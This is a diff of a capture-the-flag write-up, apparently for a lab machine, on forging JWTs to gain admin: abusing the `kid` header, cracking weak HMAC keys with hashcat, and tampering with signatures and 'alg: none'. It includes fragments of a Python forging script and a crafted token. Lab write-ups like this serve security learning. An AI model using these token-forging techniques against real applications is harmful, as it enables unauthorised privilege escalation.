@@ -4,9 +4,11 @@
 
 ...
 
+It appears that the application only allows the `ls` command. From the output, I noticed an interesting file: `188ade1.key`.
 
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-## Exploiting the JWT `kid` header value
+## Exploiting JWT
 
 Upon analysis of the retrieved JWT token value ([http://jwt.io/](http://jwt.io/)), I noticed that the `kid` field present in the headers. Moreover, I noticed the `role` field in the payload, which controls the user role. The goal will be to change this value to a higher privilege user such as `admin`.
 
@@ -54,7 +56,7 @@ class JWT_KID_EXPLOIT():
         headers = {
             "typ": "JWT",
             "alg": "HS256",
-            "kid": "/var/www/mykeY.key"
+            "kid": "/var/www/mykey.key"
         }
 
         token = jwt.encode(payload, key, algorithm='HS256', headers=headers)
@@ -99,7 +101,7 @@ headers = {
 
 `Error message: Invalid token: Algorithm not supported`
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 ### 2. Weak HMAC Keys
 
@@ -130,18 +132,17 @@ $ hashcat -m 16500 -a 0 jwt.txt scraped-jwt-secrets.txt
 
 The brute force attempt failed, and we are unable to find the valid signing key.
 
-```
-        # token = self.s.cookies.get('token')
+#### Malformed signature
 
-        # token = token[:-1] # jwt not vuln to malformed singature
-        # token = token.rsplit('.', 1)[0] # jwt not vuln to missing signature
+Remove the jwt.encode() line, and retrieve the token from the existing cookies instead. To malform the signature, remove the last character from the token.
 
-        # jwt not vuln to 'alg': 'none', 'alg': 'NoNe'
-        # token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiL3Zhci93d3cvbXlrZXkua2V5In0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ4NzExMTgyLCJleHAiOjE3NDg3MTQ3ODIsImRhdGEiOnsidXNlcl9pZCI6MiwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19'+'.' + token.split('.')[
-        #     2]
-```
+<pre class="language-python"><code class="lang-python"><strong>token = self.s.cookies.get('token')
+</strong><strong>token = token[:-1] # remove the last character
+</strong></code></pre>
 
+Output:
 
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 3. Vulnerable `kid` header value
 
